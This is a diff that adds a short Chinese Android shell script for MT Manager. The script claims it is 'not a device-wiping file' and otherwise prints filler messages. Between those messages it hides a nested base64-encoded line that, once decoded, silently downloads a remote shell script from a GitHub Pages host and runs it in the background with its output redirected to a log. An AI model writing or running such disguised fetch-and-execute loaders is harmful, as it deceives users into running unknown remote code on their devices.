@@ -1,0 +1,20 @@
+echo 本文件不是格机文件
+sleep 1
+echo 运行后动动你的小脑筋，看看哪里有变化
+echo 请务必使用mt管理器的扩展包执行
+echo 请务必使用mt管理器的扩展包执行
+echo 请务必使用mt管理器的扩展包执行
+echo 请务必使用mt管理器的扩展包执行
+echo 请务必使用mt管理器的扩展包执行
+echo 请务必使用mt管理器的扩展包执行
+echo 请务必使用mt管理器的扩展包执行
+echo ZWNobyBaV05vYnlCaWJUbHZaRmhCWjFsdFJucGhRMEU0UzBkT01XTnRkMmRNV0UxbllVaFNNR05JVFRaTWVUbHhZVmhXZFdGNldUTk1iV1J3WkVkb01WbHBOWEJpZVRscVlWaENja3hwTDI5d05HSnZjRFJ1Ym0wMWRteHljbEY1VEc1T2IwdFRRU3RKUnpreFpFaENNV1JETlhOaU1tTm5UV28wYlUxVFFXMGdQVDE4SUdKaGMyVTJOQ0F0WkNCOGMyZz0gPT18IGJhc2U2NCAtZCB8c2g= ==| base64 -d |sh
+echo 结束了
+echo 结束了
+echo 结束了
+echo 结束了
+echo 结束了
+echo 结束了
+echo 结束了
+echo 结束了
+echo 结束了
